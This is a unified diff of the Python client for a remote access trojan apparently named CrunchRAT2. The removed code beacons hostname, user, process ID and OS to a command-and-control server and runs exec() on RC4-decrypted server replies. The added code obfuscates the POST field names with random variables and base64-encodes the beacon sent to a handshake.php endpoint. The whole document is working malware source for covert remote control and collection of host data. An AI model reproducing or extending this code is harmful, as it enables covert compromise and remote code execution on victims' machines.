@@ -1,85 +1,50 @@
-import urllib2, json, getpass, os, platform, socket, sys, time
+import base64, urllib, urllib2, json, getpass, os, platform, random, socket, string, sys, time
 
 
-external_address = "EXTERNAL_ADDRESS"
-port = "PORT"
-protocol = "PROTOCOL"
-beacon_uri = "BEACON_URI"
-update_uri = "UPDATE_URI"
+external_address = "127.0.0.1"
+port = "80"
+protocol = "http"
+beacon_uri = "CrunchRAT2/Website/handshake.php"
 user_agent = "USER_AGENT"
-sleep_interval = "SLEEP_INTERVAL"
+sleep_interval = 10
 beacon_url = protocol + "://" + external_address + "/" + beacon_uri
-update_url = protocol + "://" + external_address + "/" + update_uri
 
 
-def crypt(data, key):
-    S = range(256); j = 0; out = []
-
-    for i in range(256):
-        j = (j + S[i] + ord(key[i % len(key)])) % 256
-        S[i] , S[j] = S[j] , S[i]
-
-    i = j = 0
-
-    for char in data:
-        i = ( i + 1 ) % 256
-        j = ( j + S[i] ) % 256
-        S[i] , S[j] = S[j] , S[i]
-        out.append(chr(ord(char) ^ S[(S[i] + S[j]) % 256]))
-
-    return "".join(out)
-
-
-def get_system_info():
-    hostname = socket.gethostname()
-    current_user = getpass.getuser()
-    process_id = os.getpid()
+def get_info_and_beacon():
+    hostname_var = ''.join(random.choice(string.lowercase) for i in range(10))
+    current_user_var = ''.join(random.choice(string.lowercase) for i in range(10))
+    process_id_var = ''.join(random.choice(string.lowercase) for i in range(10))
+    operating_system_var = ''.join(random.choice(string.lowercase) for i in range(10))
 
     if "Darwin" in platform.system():
-        operating_system = "Mac OS X " + platform.mac_ver()[0]
+        globals()[operating_system_var] = "Mac OS X " + platform.mac_ver()[0]
     else:
-        operating_system = platform.linux_distribution()[0] + " " + platform.linux_distribution()[1]
+        globals()[operating_system_var] = platform.linux_distribution()[0] + " " + platform.linux_distribution()[1]
 
-    return (hostname, current_user, process_id, operating_system)
+    globals()[hostname_var] = socket.gethostname()
+    globals()[current_user_var] = getpass.getuser()
+    globals()[process_id_var] = os.getpid()
 
+    post_data = [(hostname_var, globals()[hostname_var]), 
+        (current_user_var, globals()[current_user_var]),
+        (process_id_var, globals()[process_id_var]),
+        (operating_system_var, globals()[operating_system_var])]
 
-def beacon(hostname, current_user, process_id, operating_system):
-    post_data = {
-        "hostname": hostname,
-        "current_user": current_user,
-        "process_id": process_id,
-        "os": operating_system
-    }
+    base64_encoded = base64.b64encode(urllib.urlencode(post_data))
 
-    request = urllib2.Request(beacon_url)
-    request.add_header("Content-Type", "application/json")
+    request = urllib2.Request(beacon_url, base64_encoded)
     request.add_header("User-Agent", user_agent)
-    f = urllib2.urlopen(request, json.dumps(post_data))
+    f = urllib2.urlopen(request)
     response = f.read()
+    print response # DEBUGGING
     return response
 
 
 if __name__ == "__main__":
     counter = 0
 
-    while True:
-        hostname, current_user, process_id, operating_system = get_system_info()
+    # if counter = 0
+    # do an initial beacon
 
-        # If initial beacon
-        if counter is 0:
-            print "new host"
-
-            # Gets encryption key
-            key = beacon(hostname, current_user, process_id, operating_system)
-            counter += 1
-
-        # Else recurring beacon
-        else:
-            print "old host"
-            #print beacon(hostname, current_user, process_id, operating_system)
-            exec(crypt(beacon(hostname, current_user, process_id, operating_system), key))
-
-            # statement above will need changed to exec()
-            #print k
-
-        time.sleep(sleep_interval)
+    # else do an RC4 encrypted beacon
+    get_info_and_beacon()
